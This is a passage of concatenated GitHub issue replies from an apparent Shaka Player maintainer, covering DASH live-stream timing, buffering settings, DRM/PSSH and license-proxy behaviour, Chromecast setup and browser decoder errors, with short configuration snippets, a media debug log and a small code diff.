few minutes would require much more work on our part.. What I mean is the segment times should start at 0 and availabilityStartTime should be when the live streams starts.\nFor example, let's say you start streaming at 8:00.  The first media segment should have a time of 0 and the availabilityStartTime should be 8:00.  You then have a normal live stream for 2 hours; after that, you stop the stream.  You now have a VOD clip that is 2 hours long and starts at 0.  This is how in-progress recording work.  This should work even if you don't know that you'll be streaming for 2 hours.\nHowever, this case won't work for something like a TV channel which runs for days and then you only want to keep the last hour of the stream.. @itaykinnrot See #1332.  We'll be adding a configuration for this.  Also note that you could write your own TextDisplayer to use our text pipeline and then still use player.setTextTrackVisibility.. Unfortunately this fix broke seeking into a gap and gaps before the start (since video.seeking will be true in those cases).  So this will require a different fix.. @johnBartos I think you should file a new issue for that, thanks.. First, when determining how much to keep buffered, we override the minBufferTime of the manifest with the configuration value bufferingGoal.  So since it is set to 30, we will buffer up to 30 seconds of content ahead of the playhead.  If you want to buffer less, you'll need to change the configuration.\nSecond, we should only stall when there is less than 0.5 seconds of content left in the buffer.  How are you determining how much is buffered?  What is the value of video.buffered?  If you enable logging, do you see logs about large gaps?  My guess is that we have buffered 15 seconds of audio, but not enough video, so we stall when the video runs out.. > So what function of minBufferTime then?\nIt will specify an override if the configuration is smaller.  So if you specify 5 seconds in the configuration and the manifest says you need 10 seconds buffered, we will override the configuration and use 10 seconds.  Otherwise we will use the value in the configuration.\nIf you upgrade to the latest from master, there is a new function player.getBufferedInfo() which will report the current buffered ranges for different types.  Please try with large gap jumping enabled and report the value of player.getBufferedInfo() when it stalls.\njs\nplayer.configure({streaming: {jumpLargeGaps: true}});. We are already going to use the Network Information API to determine the default bandwidth estimate (see #994).  We could also use this to help with network changes, but browser support is non-existent outside of Chrome (see caniuse).. Error 3014 is caused by the browser throwing an error.  I can reproduce the error locally.  When the error is thrown, the error.data[0] field is 3, which is MEDIA_ERR_DECODE, which is a decoder error.  There is nothing Shaka Player can do, Safari doesn't support playing your content.. @hghazzi Again, 3016 VIDEO_ERROR is usually a decoder error, so it is likely some kind of content problem.  The fact that is inconsistent can be because of adaptation choosing different tracks.\nBut please file a new issue including a manifest URL so we can look into it.. Thanks for finding this, will have a fix up soon.. I see some errors in the console which may be causing the track list to not get updated.  I saw a change recently to fix some issues, so it may be fixed on master (but the receiver hasn't been updated to match).  @theodab since you have been working on Chromecast recently and have fixed those bugs, can you take a look?. Unfortunately we removed support for AdaptationSet switching when we added HLS.  We used to honor which AdaptationSets we could switch between, but it didn't work well for HLS.  So we changed to using a heuristic model for determining which streams we can switch between.\nCurrently, we use the current language and role to determine which streams we can switch between.  For using channel configuration, you already filed #1013 to deal with that.  Once that is done we can talk about how ABR works with that.. It should be supported.  When an MP4 segment is protected, the whole segment isn't encrypted, only pieces of it.  In fact, the container data (i.e. the MP4 \"boxes\") is in the clear; only the codec data is encrypted, and in some cases, not all of that.  So the embedded EMSG boxes should still be in the clear so we should still be able to read and handle them.. You don't need to do any work, all you need to do is load the asset.  Shaka Player will handle all the parsing by default.  You'll want to add an emsg event listener to the Player to get an event when we parse the EMSG boxes.  Unfortunately we don't have any demo assets that have EMSG boxes in them.\nInside Shaka, the parsing code is inside StreamingEngine.. There was a bug where we didn't set the start time in live streams correctly.  It has been fixed and you can use the nightly instead to use the correct start time:\nhttps://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=https://nginx.dev.cdnnow.ru/live/index.mpd;license=https://one.drmnow.ru/widevine;lang=en-US\nWe have reproduced the playback bug.  It appears to be a platform issue.  Both Firefox and Chrome are generating the same license requests and we get back a reasonable license response, but Firefox is failing to playback the content.  I'll look into the CDM more to see about extra logging info to help.\nHere are the logs from the about:media plugin:\n```\nHTMLMediaElement debug data\nhttp://localhost/shaka/demo/#asset=https://nginx.dev.cdnnow.ru/live/index.mpd;license=https://one.drmnow.ru/widevine;lang=en-US\n    blob:http://localhost/dc6250f9-7780-4870-bd9a-762b898bbcf6\n    currentTime: 23877.21199987602 readyState: 1\n    Quality: -- (total:0 dropped:0 corrupted:0)\n    Buffered ranges: [(23866.732, 23874.989)(23875.012, 23883.325)(23883.348, 23891.661)]\n    SourceBuffer[0]: (23866.676, 23874.989)(23875.012, 23883.325)(23883.348, 23891.661)\n    SourceBuffer[1]: (23866.732, 23891.699)\n    Internal Data:\n        Audio Decoder: ffmpeg audio decoder\n        Audio Frames Decoded: 6\n        Audio State: ni=0 no=0 wp=0 demuxr=0 demuxq=0 decoder=0 tt=-1.0 tths=-1 in=3 out=3 qs=0 pending=0 wfd=0 eos=0 ds=0 wfk=0 sid=6\n        Video Decoder: Chromium CDM video decoder\n        Hardware Video Decoding: disabled\n        Video Frames Decoded: 0 (skipped=0)\n        Video State: ni=0 no=0 wp=1 demuxr=0 demuxq=0 decoder=0 tt=-1.0 tths=-1 in=500 out=0 qs=500 pending:0 wfd=1 eos=0 ds=0 wfk=0 sid=7\n        Dumping Data for Demuxer: 7f85d2d06c00\n        Dumping Audio Track Buffer(audio/mp4a-latm): mLastAudioTime=23877.218000\n        Audio Track Buffer Details: NumSamples=1077 Size=851260 Evictable=358051 NextGetSampleIndex=454 NextInsertionIndex=1077\n        Audio Track Buffered: ranges=[(23866.676000, 23874.989000), (23875.012000, 23883.325000), (23883.348000, 23891.661000)]\n        Dumping Video Track Buffer(video/avc): mLastVideoTime=23891.699000\n        Video Track Buffer Details: NumSamples=750 Size=8057719 Evictable=5371813 NextGetSampleIndex=750 NextInsertionIndex=750\n        Video Track Buffered: ranges=[(23866.732000, 23891.699000)]\n        EME Info: Key System=com.widevine.alpha SessionsInfo=(sid=8C41A0D82A52A25CA37F10E9834D8908(kid=61656435306535326532336437653461 status=usable))\n        MediaDecoder State: channels=2 rate=44100 hasAudio=1 hasVideo=1 mPlayState=LOADING mdsm=7f85cae16800\n        MediaDecoderStateMachine State: GetMediaTime=23877212000 GetClock=-1 mMediaSink=7f85d5127030 state=SEEKING mPlayState=1 mSentFirstFrameLoadedEvent=0 IsPlaying=0 mAudioStatus=idle mVideoStatus=waiting mDecodedAudioEndTime=23877218219 mDecodedVideoEndTime=0mAudioCompleted=0 mVideoCompleted=0\n        VideoSink Status: IsStarted=0 IsPlaying=0 VideoQueue(finished=0 size=0) mVideoFrameEndTime=0 mHasVideo=0 mVideoSinkEndRequest.Exists()=0 mEndPromiseHolder.IsEmpty()=1\n\n``. Take a look at #1036.  You could create a newManifestParserthat forwards to the regularDashParser` and then you could look at it before you return it back to the Player.  Take a look at the Manifest object and the Manifest Parser tutorial.\nTo choose initial streams you could create a custom AbrManager to choose the initial streams.  Or you could just switch streams after starting playback using player.selectVariantTrack.. There isn't an exposed list of segments.  This is due to the fact that in some Dash manifests there may be infinite segments.  For SegmentTemplate with duration attribute, we know all segments from now to the end of the presentation (which for live is infinity).  So there may not be an explicit list available.\nWhat you can do is construct a list by using the getSegmentReference method.  This takes an index and gives you the reference at that index.  Most indexes start at 0, but you can use findSegmentPosition which takes a time and gives the index.  You can pass in 0 for VOD or the live edge for Live content.\njs\nvar list = [];\nvar i = stream.findSegmentPosition(0);\nwhile (true) {\n  var seg = stream.getSegmentReference(i);\n  if (!seg) break;\n  list.push(seg);\n  i++;\n}. We also already do retry logic for non 2xx response codes.  So if we (for example) get a 500 response, we will simly wait a second and resend the request.  We will retry for any non-2xx response except 401/403.  You can set the DRM retry count to a larger number and we will retry that number of times before registering a failure. (this logic is inside NetworkingEngine.request)\njs\nplayer.configure({drm: {retryParameters: {maxAttempts: 5}}});\nAlso, you can't use a response filter for retrying since a response filter isn't ran for error cases, only when we get a 2xx response from the server.  But you could retry if the server gives a 2xx response but the response is wrapped in some error text.. It looks like we need an app callback to handle network errors and retries.  This is possible for media streaming using #960.  But it isn't possible for license requests (or manifest requests for that matter).  We will need to think about how this will be best implemented.. The text you quoted is only an example, not a specification.  The contents of a <ContentProtection> element is dependent on the key system.  In this case, the contents is defined by the non-existent, example key system http://example.net/052011/drm.  PlayReady has an element <ms:laurl> to specify the url, which you can follow that feature in #1010 and #484.  Widevine doesn't have a standardized way of providing the URL in the manifest.\nThe schemeIdUri attribute specifies the type of key system that element is dealing with.  It is only a URL in that example.  For example, the schemeIdUri for Widevine is urn:uuid:edef8ba9-79d6-4ace-a3c8-27dcd51d21ed.\nThe preferred way is to specify the URL in the app by using player.configure:\njs\nplayer.configure({drm: {servers: {\n  'com.widevine.alpha': 'https://widevine-proxy.appspot.com/proxy',\n}}});. We assume that the <video> is under our control for the lifetime of the Player object.  If you call load() again, we will restart and load that content instead.  You shouldn't change the video.src while the Player is in use.  To indicate the Player is no longer being used, call player.destroy().  Also note that both destroy() and unload() return a Promise which you should wait to complete before doing other work.\nWe will continue to keep the MediaSource attached to the video even after unload() (and also before load()) because some browsers take a bit to setup the media stack.  To reduce startup latency, we keep the MediaSource attached (video.src is set to a special blob string) for the duration of the Player instance.\nWe will not restore the video.src to the original string, but we will reset the <video> element so that it is ready to have your app set the source to whatever you want.. This looks similar to https://crbug.com/690583.  But I cannot reproduce.  I went to the hosted demo and entered one of the protected demo asset URLs into the custom asset field and used a bad URL for the license server.  I get an error and the video stops at the end of the clear lead.  If I select a different asset and click Load again, the new asset plays fine.\nCan you reproduce with just the hosted demo without an external proxy?  Can you provide a manifest URL to a content that reproduces?  What is the exact version of Chrome you are using?  What version of the Widevine plugin are you using?  You can get it from navigator.plugins (unfortunately chrome://plugins doesn't work anymore).. First, presentationTimeOffset must be an integer, so the value 3.12 is invalid.  You can use the timescale attribute to get decimals, but it should match the timescale in the media.  So if the timescale is 100, then the presentationTimeOffset would be 312.\nIt also looks like we aren't handling the presentationTimeoffset value correctly with timescale.  I'm marking this a duplicate of #1099.. Without a playable URL to test with, it will be hard to diagnose the problem.  You can send it to shaka-player-issues@google.com if you can't post it publically.\nMy guess (without being able to look at the content) is that there is a keyframe at 3 seconds.  When we set the presentationTimeOffset, this changes where the media time 0 is.  The browser will drop any frames that appear before time 0.  If the first frame after 0 is not a keyframe, the browser won't be able to decode it so it will discard those frames until it hits a keyframe.. That is an interesting idea, but unfortunately it won't work.  We use the closure compiler to compile the library.  Since that method is private and not exported, the compiler will rename it to reduce space.  I don't think we should export it since it won't be used by 99% of people.\nBut we will think about ways to enhance the default ABR manager to make it easier to extend only pieces of it.. getPlayheadTimeAsDate returns a Date object, so you probably shouldn't use division on it (though it seems to work).  But it also only works on live streams, not VOD.  In a live stream, getPlayheadTimeAsDate returns the wall-clock time of the playhead position.  So if it is 10:30 now and you are playing 10 minutes behind the live edge, it will return 10:20.\nvideo.currentTime will return the current playhead time in presentation time.  This is likely the time you want since that will be the time of emsg.startTime and emsg.endTime.. Please post a new issue for this.. The HLS version of the asset works.  The issue may be caused by encoder drift.  HLS is immune to encoder drift and the two versions are generated by the same process.\nhttps://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=//storage.googleapis.com/shaka-live-assets/player-source.m3u8. @kqyang @joeyparrish \nThis seems to be against how standard Widevine key rotation works.  IIRC, Shaka Packager sets the default_KID and the tenc box to all 0's and uses the per-frame key ID property to signal what key to use to decrypt.  The content is in a single Period, but different frames may be encrypted using different keys.  Then each media segment contains a pssh box to signal which keys are needed for that segment.  Does this mean this kind of key rotation is against the IOP guidelines?  Would non-hierarchical key rotation require using multiple Periods?\nWidevine has a separate concept of a content ID and a key ID.  A single piece of content has a single content ID, but it may have different key IDs (e.g. key rotation or for SD/HD).  These are not really hierarchical, but the license server can derive the keys from the content ID (but the client can't).  Would this kind of key rotation be inline with the IOP since the content ID doesn't change?\n@meladc There is a configuration manifest.dash.ignoreDrmInfo which will tell Shaka Player to ignore the data in the manifest and force us to make requests based on the media.  Will this work for you?. The filtering logic only works if the PSSH data is exactly the same.  If they are different, even if they result in the same license request, we may send duplicate requests, since we don't parse the PSSH data.  Also, it is possible for the media to contain extra or incorrect PSSH data that should be ignored.  When on embedded platforms, there is usually a limit on the number of active sessions.  So making duplicate requests can be bad.\nFor example, if the media contains PSSH data for and old license server, but the manifest is updated to a new one.  The old data may result in errors from the server, or may result in extra sessions being created, or could mess with logging on the license server proxy.\nWe might be able to parse v1 PSSH boxes, which contain the key IDs that the data represents.  This could allow us to filter by key ID like we do for the manifest.  But this will only work for v1 PSSH data, there is a lot of legacy content out there where the media uses v0 PSSH data.. @jsvictor The CDM definitely does track that info to handle expirations.  The real question would be whether you could get that info from it.  From EME (in JavaScript) there is no way to get that info.  Some key systems may be able to expose this in some implementation-specific way.  For example, Widevine uses renewals to handle this case.  The license is only valid for a few minutes and the client needs to update the license every few minutes to continue playing.  This tells you they are still watching the video.\nBut you'd need to discuss this with a specific key system provider on how to get that info.\n@meladc Sorry for not noticing your reply earlier.  I think the correct behavior would be to always track pssh data from the media to support both kinds of key rotation.  To support the old behavior of overriding the media, we will add a configuration parameter to ignore the pssh data in the media.. An update: after #1360 we support the MPD adding new Periods with new PSSH data in it.  So we now support the MPD-based key rotation.  We still have the behavior of ignoring the PSSH in the media if the manifest has PSSH data in it.\nSo what we need to do now is add a flag for whether to ignore PSSH data in the media when the manifest also has PSSH data.. As discussed in the ExoPlayer issue, your value of Period@start is changing.  This is something we don't support and trying to support would probably be difficult.  We will probably wait until the discussion on the IOP (Dash-Industry-Forum/DASH-IF-IOP#160) is done to see whether this should be a supported use case.  But it may be difficult to support this use case, especially since there are better ways to do the same thing.. Are you asking to only request the manifest once?  That really depends on the content of the manifest.  DASH has multiple representations of segments.  Some representations don't require updates and some do.  If you use SegmentTemplate+duration, we can know all possible segments from the first manifest.  You can then set minimumUpdatePeriod to a huge value so we never request the manifest again.\nHowever, if you use other segment representations, we will require manifest updates to know about future segments.  Many of the representations require explicitly listing every segment in the manifest, so we need a new manifest to know about new segments.\nThe prefered way of doing this would be to use the <Location> element.  This tells us to make future manifest requests to the given URL instead.  This allows the first request to get a new token, but for future manifest requests (to the new URL) to always give the same token back.. The problem is that you have 50 second video segments that only have one keyframe.  As we play, we only keep bufferBehind amount of content buffered.  This means we remove content that is further than this far back.  Because of how MSE works, when we remove something, the browser will remove up to the next keyframe.  This means when we get to 0:37, we will try to remove 0:00-0:07.  Since there are no keyframes past that, the browser will remove the entire segment, up to 0:51.\nYou have three options: (1) reduce the segment size, (2) increase the keyframe (GOP) interval, or (3) change the streaming.bufferBehind configuration so we keep more buffered.\nAlthough, we should change it so bufferBehind will be overridden by the max segment size to avoid this problem.. Closing due to inactivity.  If this is still an issue, feel free to reopen.. There is a waitingforkey event on the <video> element that is fired when the browser stops playing because it doesn't have the required keys.  You could also listen to the canplay or playing video event that is fired once it resumes.  We wanted to do this in the past, but the timing of these events is not specified and doesn't always work cross-browser.  We couldn't provide a consistent detection of when we didn't have the required keys.\nThe buffering event is only used to track the buffered content.  The browser is stopping playback because it doesn't have the keys.  But otherwise there is no way to detect what the browser can play without trying to actually play it.\nSee w3c/encrypted-media#284. See #1013.  Currently we will select an audio track based on the current preferred audio language.  If there are multiple matches, we will pick an arbitrary choice.  It is possible to select an explicit one using selectVariantTrack.  You can use getVariantTracks to get an array of tracks, then find the one with the correct channelsCount value and switch to that.  Note that variants refer to an audio+video pair, so you'll need to select the one that has the desired video properties as well.. This looks similar to #707.  There isn't really anything Shaka Player can do to help.  All we do is give the media segments to the browser, it is up to the browser to play them correctly.  This is likely a problem with the media segments.  This is probably a better question for the Wowza team (https://www.wowza.com/support).. > 1. Content is being requested by the client that is in the future (content does not exist on the origin server yet)\nSome DASH manifests can specify all future segments, so we don't have to wait for a manifest update to know the times and URLs for the media segments.  This means that we could request a segment before the server generated it.  This can happen if there are clock sync problems or if the server is slowing down.  \nThis shouldn't cause a problem since we will wait a few seconds and retry the request.\n\n\nContent is being requested by the client that is in the past and outside of the availability window (this is why I was asking about #999)\n\n\nThis can be caused by encoder drift or clock sync issues where we choose an incorrect start time.  Those may be fixed by #999.\n\n\nContent is being requested that is in between two valid segments (content that does not align with segment boundaries defined in the manifest)\n\n\nThis is definitely a bug, I don't even know how this could happen.  If you have a repro, please file a bug for this.. A 2-4 byte request is usually a server certificate request.  My guess is your license server proxy doesn't support this request (probably it is assuming just license requests), so it is rejecting it.  You'll need to either talk to the proxy host to handle this request or update it to handle the request (the request should just be sent as-is to the license server).. As Chrome starts requiring certificate requests, people may need to update their license server proxies to handle the new certificate requests.  If you have any questions about how to do this, it is best send to Widevine directly at http://www.widevine.com/contact.html.. It looks like makeRequest isn't exported, so the demo can't access it.  You can either add @export to the method or you can create a Request object manually and just not include the fields you don't need.  NetworkingEngine will fill any missing fields with defaults.\njs\nvar request = /** @type {shakaExtern.Request} */ ({uris: [uri]});\nThat cast is needed since it has missing fields.  But the cast for Array.<string> shouldn't be needed.. The clear asset hasn't played since we added Live support in 113d974.\nThe encrypted asset hasn't played since we added partial segment requests in a93455a9.. @kocoten1992 Are you manually calling selectVariantTrack in your case, or are you selecting tracks in the drop-down menu on the demo?  If you call selectVariantTrack, do you call configure before it?\nI believe the fact it only happens on 1080p is a red herring.  I can reproduce something similar during startup on 1080p, but not after a bit of playback.  I think the problem is that the demo app calls player.configure() when we change tracks.  This causes a track switch because of how we handle language changes.  This configure call selects the 1080p track because ABR thinks it is the best track (even when ABR is disabled).  Then when you select the 1080p track manually, it is already \"selected\", so we don't clear the buffer.\nWhen someone calls player.configure(), we should only switch tracks if the current track selection doesn't match the new configuration.  This may be related to #856.. Thanks for the offer to fix, but that would not be the preferred fix.  An app should be able to call configure() like that without changing tracks.  We need to change configure() to not always switch tracks.  Specifically it should only switch tracks when the new configuration forbids playing the current stream (e.g. due to Restrictions).. I am not that familiar with Chromecast development, but I will help as I can. You can get hosted versions of the library at CDNJS (https://cdnjs.com/libraries/shaka-player).  We don't provide hosted versions of the receiver, that is up to the app.  The compiled receiver is only in the master branch since it is not in a release yet.  You will have to compile it manually using build/build.py or build/all.py.  This will compile the source files for the receiver into that bundle file.\nOr, alternatively you could load the receiver app without compiling.  It should only need the compiled library and then: demo/common/assets.js, demo/common/controls.js, demo/common/demo_utils.js, and demo/cast_receiver/receiver_app.js.  If you are just editing demo/cast_receiver/index.html, you can just load those files and remove the load.js file since that is just a bootstrapping script.\nOn the sender side, you should use an instance of shaka.cast.CastProxy.  This will handle connection to the receiver and will proxy any calls to the Player through to the receiver (e.g. calling player.load() on the sender will load the asset on the receiver).\nWe only support using a custom receiver, trying to use the default receiver won't work.\nWe should provide tutorials on how to setup Chromecast support.. > Then I'm using that player's instance to load the asset and the video to play/pause. Is this what you were referring to?\nCorrect.  Using that player and video instance will proxy to the remote object or will proxy to the local versions when not casting.\n\nIs there a built in method for sending custom messages? if not, how can I integrate one with current's cast_proxy?\n\nWe don't have any way to do it, but you should be able to use the normal cast messaging.  We use a special namespace for messaging, so it shouldn't conflict with your messages.. Error 3016 is a decoder error, Safari is just refusing to play the content.  I notice the content is multiplexed; maybe Safari doesn't support multiplexed MP4?  Do you have the same stream without audio or with a separate audio stream?\nWhen I play in Chrome, I notice some logs from chrome://media-internals:\n\nMedia segment did not contain any coded frames for track 257, mismatching initialization segment. Therefore, MSE coded frame processing may not interoperably detect discontinuities in appended media.\n\nMaybe Safari is choking on this or the multiplexed content?  I'll look into why we are getting these logs.\nAlso, FYI, we disabled native TS playback on Safari since it is broken for a lot of content and doesn't play adaptation or track switching well with MSE.. I just re-tested and it seems to work for me.  So it may be fixed unless you fixed the stream another way (I didn't look too much into it).  Since a lot has changed since then I would suggest testing again.\nFor now I'll close it, but if the issue persists you can reopen.. That is a code given to us by the browser.  These codes are not publically documented.  Did you set usePersistentLicense to false?  You can't store licenses offline on desktop.  Does the error happen during storage or when playing?  If you reload the page, can you play it then?  Can you provide a link to the code you are testing with?  You can send it privately to shaka-player-issues@google.com if you want.. Duplicate of #1148\n0 != null, the problem is that segmentAvailabilityDuration_ is not infinity.  This is the same problem as your other manifest, your live streams have a duration.  We'll continue the discussion there.. I don't think changing the duration of a Period is allowed.  If the manifest specifies that the Period has a duration of some value, it must always have that duration.  You can either add new Periods with the new content or you can simply drop the duration.\nThe problem is that when there is a duration, we treat it as an in-progress recording, which has different semantics than a live stream.  This should probably be treated as a live stream and not an in-progress recording.  I think the problem is that we will calculate the duration of the presentation based on the sum of Period lengths.  Since all your Periods have a duration, we are able to calculate the duration of the presentation.  We should probably update it so it doesn't calculate the duration on live streams, it should only use the mediaPresentationDuration attribute.. An in-progress recording is just like the name suggests, a VOD stream that isn't fully available yet.  We treat it as a live stream until it is done recording, then it is a VOD stream.  The main features are that it appears live at first (it has an update period, AST, updating segment list) but has a known duration and has an infinite availability (since it should be VOD).  We use the live+duration to signal this type of manifest.\nThis type of manifest isn't really different than a live stream, but it can change the UI.  For example, the seek window will be increasing in size and the times will start at 0 rather than showing a negative time relative to the live edge, like in live streams.. Note that even with my proposed fix, the live stream won't play.  I think the problem is the same as #1105.. Without a license server URL, we can't reproduce the problem.  You can send the URL privately to shaka-player-issues@google.com if you like.  I can play all our live and protected content fine on Chromecast, so we need to be able to play your content to see any issue.. We just reverted the fix for #1061.  Can you test again to see if that fixes it?  You can use the nightly, but be sure to clear the cache and check the version starts with v2.2.0 followed by a number that is at least 133:\nhttps://nightly-dot-shaka-player-demo.appspot.com/demo/. We just reverted the fix for #1061.  Can you test again to see if that fixes it?  You can use the nightly, but be sure to clear the cache and check the version starts with v2.2.0 followed by a number that is at least 133:\nhttps://nightly-dot-shaka-player-demo.appspot.com/demo/. We currently don't support iOS since iOS doesn't support MediaSource.  But after #997 we will support direct playback of HLS content on iOS, but not DASH.  Also, we will just be using the native HLS support anyway, so it won't gain you anything.. What are you trying to update?  If the content is VOD, you don't need to update the segment list, so there isn't much else that needs updating.  If you are adding segments later, then it isn't static.. Can you post a playable URL to some content that reproduces your problem?. @chrisfillmore We actually already do something similar with the <EventStream> elements in DASH.  We poll the current time and fire timelineregionenter and timelineregionexit when we enter/exit a region.  We should probably just extend that behavior for the emsg boxes too.. Usually the reason the video stops and you don't get errors is because the key is missing.  This can happen because of problems packaging the content or because of proxy problems.  On Chrome, you can navigate to chrome://media-internals to get more info about what the media element is doing.  Also if the audio ends and the video doesn't, it will stop playing while it waits for the audio segments.  Your audio and video streams need to be the same duration.. We don't use Error objects, we use a custom error object shaka.util.Error.  Any Promise rejections on public APIs should be rejected with an instance of that type.  If it doesn't, can you say exactly where it happens?\nInternally we use Promise.reject() for simplicity since we don't need a specific error.  It is common to do this in larger Promise chains for fallbacks or when we just wrap a native error code.  For example, if a network error occurs (no matter what it is), we will retry the request.  So it doesn't matter that the error object is undefined, what matters is that we hit the catch() callback so we run the retry logic.\nUnfortunately, using an explicit error object for every Promise rejection would be a lot of work.  We would need to create new error codes for internal-only use, which could confuse users and risks the error propagating to an app.\nBut again, if a public API has returned an empty rejection object, that is definitely a bug.  Otherwise we will continue to avoid it if possible, but continue to use it to simplify our code.. Are you talking about the timeShiftBufferDepth attribute?  That attribute specifies how long the content is alive on the server.  If you tried to make it longer, we may not be able to download the segments because the segments no longer exist on the server.  We could add a way to reduce the size similar to the seek range but for live.. Closing due to inactivity.  If you have any more questions, feel free to reopen.. The problem is this is using multiplexed content (a stream with both audio and video).  Also, the audio and video streams don't start at the same time.  We use the first packet to get the time, but the other stream (which appears later) starts before that packet.  Some browsers don't support multiplexed content and require the streams to be separate; we usually only support separate streams, but don't explicitly forbid multiplexed streams.\nIt may be possible for this to happen for non-multiplexed streams as well.  A media segment doesn't have to start with a key frame.  If it starts with a B-frame, then the PTS times of the frames will be out of order.  We should parse the first few frames until we hit a key frame to avoid this.\nBut that won't help your stream, since the problem is that there are multiple streams within the TS packet stream.  If we see that it is a multiplexed stream (which I think we will always know), then we can probe further to find the second stream, but it may require a second download probe to get the timestamps.. I think that issue is a problem with Chrome.  Chrome confuses PTS/DTS times, so if we use the PTS times as the offset, the DTS may become negative.  This is technically a bug in Chrome that they are actively working on, but we should still support this case.  Unfortunately the fix is to use DTS times, which may cause a gap at the beginning of the stream, but gap jumping should be able to compensate for that.. Actually I think it is a problem with how we are adjusting the times.  The segment we get from muxjs has been adjusted to start at 0, but we also use presentationTimeOffset to adjust the segment further, which causes it to be negative.  To be able to support both non-zero VOD and live content, we need to patch muxjs so we don't have to use setBaseMediaDecodeTime.  You can follow along in videojs/mux.js#168.. I am unable to reproduce.  I see that there are errors because of #1204, which has been fixed.  If I try the nightly site, it seems to work fine.  Note that we will only download subtitle/caption tracks when the captions are shown and only when you use player.setTextTrackVisibility, meaning if you use the default browser controls it won't work.  Can you try again from the nightly?\nhttps://nightly-dot-shaka-player-demo.appspot.com/demo/. It will be available in v2.3.1 (and probably v2.2.10), which will be released in a week or two.. Thanks for finding this.  Do you want to fix the typo also?. You can just update this one.. You can already select the text track language/role by going under the Info section.  I don't think we need to add a drop-down menu in the overlay bar, especially since there isn't one for the resolution.. Why not just change how the manifest.dash.ignoreDrmInfo configuration works?  Right now it only activates if there is existing ContentProtection elements.  But you could change it to always assume encrypted content.  Couldn't you just do:\n```patch\ndiff --git a/lib/dash/content_protection.js b/lib/dash/content_protection.js\nindex 5a3c4440c..054e8b99e 100644\n--- a/lib/dash/content_protection.js\n+++ b/lib/dash/content_protection.js\n@@ -170,7 +170,7 @@ shaka.dash.ContentProtection.parseFromAdaptationSet = function(\n// If there are only CENC element(s) or ignoreDrmInfo flag is set, assume all\n   // key-systems are supported.\n-  if (parsed.length && (ignoreDrmInfo || !parsedNonCenc.length)) {\n+  if (ignoreDrmInfo || (parsed.length && !parsedNonCenc.length)) {\n     var keySystems = ContentProtection.defaultKeySystems_;\n     drmInfos =\n         MapUtils.values(keySystems)\n```\nThis has the disadvantage of requiring DRM initialization on clear content, but at least it is behind a flag.. Closing due to inactivity.  If you still need help you can reopen the issue.. I believe this was fixed by 87c19da2c, can you please try the latest master.. @joeyparrish We can't use the Axinom assets since they don't allow persistence.  But we can use any of the demo Widevine assets with the header authentication endpoint in the license authentication tutorial.\n@vladimir-kazakov I have confirmed that this happens.  But it is important to note that this is an app problem.  It is the job of the app to authenticate any license requests as needed.  So if you are storing things offline, then you need to store whatever authentication info that is needed along with it (e.g. using the opt_appMetadata property).\nI will update the demo app to do this.  But a custom app will need to configure the Player that is given to the Storage instance with any needed authentication.. @barinbritva What doesn't work?  What steps did you take to get a problem?  This only applies to the demo app; if you are using a custom app, it is your responsibility to set up any authentication before calling storage.remove.. @stroemlund Can you give us a manifest URL?. @stroemlund  That manifest doesn't use presentationTimeOffset, so the issue is unrelated.\nWhen I fetch the manifest at 2018-02-01T17:50:49Z, the availabilityStartTime is 2018-01-29T07:43:30Z, which puts the live edge at 295639 seconds.  The first segment in the manifest is at 26610480000 / 90000 or 295672 seconds, which is in the future.  It looks like your stream is suffering from drift.  See #999.\nSince this is unrelated I'm closing the issue.  If you have problems with another stream, you should probably file a new issue.. No, we are still working on fixes for drift, which you can follow in #999.  The fix for SegmentTemplate with duration will appear in 2.3.3.. Every live manifest type requires clock sync.  Changing from duration to SegmentTimeline only changes how the segments are represented, it doesn't change the timeline.  We still require accurate clock sync to determine where to start playing.  When we start playing a live stream, we calculate now and use that to determine the live edge, which is at now - AST.\nLooking at the Elemental manifest, if we fetched your manifest at 2018-02-09T12:26:44 (the publishTime), then the live edge is at 7094701 seconds.  The last audio segment in your manifest starts at 7065899 seconds or close to 8 hours off.  My guess is that this is a timezone problem.. You can look at #1265 for an in-depth description of how segment times  work.  It deals with multi-Period live, but the basic concepts are the same.\nBasically there is a concept of a \"presentation time\".  This represents the time that a segment will be played.  For our case, this also maps to the <video> current time.  Presentation times start at 0.  For live content, the wall-clock time of availabilityStartTime represents 0.  So when you specify that a segment starts at S@t of 339163178623 (in timescale units), then that is the presentation time that it will be played at (presentationTimeOffset and Period@start can change this, but you don't use it).\nWhen we start streaming, we need to determine what presentation time to start playing at.  We use now - AST to determine the presentation time to play at.  So in your ruby code, we start playing at presentation time 7086395 seconds.\nNote that you can't change the S@t times because they need to match the values in the media segments.  If you change the manifest, when we append the segment to the <video> element, it will appear at the wrong time in the video timeline.. See #999 for ignoring availabilityStartTime and just using segment times for determining start time.\nI will write up a doc describing this is much more detail since there has been a lot of confusion about how live works in Dash.\nIt is important to note: segment times are in presentation time, not wall clock time.  Please ignore wall clock time since it is ONLY used to determine where we start playing.  We only use it to determine where to set video.currentTime initially.  Once we have it set, we ignore any wall clock time.  (There is one exception when we calculate availability, but that is entirely separate from this discussion)\nSo you start streaming, what presentation time do we start at?  It is now - AST, which is 1900 - 1000 or 900.  So we set video.currentTime to 900 and start streaming.\nFrom this point forward, we only deal with presentation times.  These times start at 0 and go forward (think like a VOD stream).  While we are streaming, we look at video.currentTime to determine which segment we should download next.  We determine each segment's presentation time and use that to pick the right segment.\nSo lets convert the three segments you listed to their presentation times.  A segment has a presentation time of: (@t - @presentationTimeOffset) / @timescale + Period@start\nSegment 0 will have a presentation time of:  (1880 - 0) / 1 + 0 or 1880.  Similarly segment 1 will have 1890, and segment 2 will have 1900.  So your segments are 1000 seconds in the future.\n\n\nI think that we should offer or be by default less strict with timing but I know that deep inside this is mostly an MPEG dash spec \"problem\", it'd be pretty good if there was a simple MPEG dash spec for live streaming.\n\nThis exists, it is called the IOP Guidelines.  This is much more realistic and restrictive than the DASH spec itself.  But even that is a bit permissive on what is allowed.\n\nGiven that the START_PRESENTATION_TIME is 900 what a dash client (shaka) does is to search the segment list for a S@t equals to AST + START_PRESENTATION_TIME?\n\nThe segment times are in presentation time, so this doesn't use AST.  Once we have 900, we look up a segment with a presentation time of 900.\n\nGiven that AST is 0 (in wall clock) does this mean that shaka should use the segment SEQ=2 to start playing?\n\nThat is not correct.  AST is equivalent to 0 in presentation time.  So if AST is 1000 in wall clock time, then that is equivalent to 0 in presentation time.  But again, this only means that if we start playing at 1900 wall clock time (e.g. using Date.now), then we are at 900 in presentation time.\n\nOnce Shaka know which Segment to start does it drops the timing 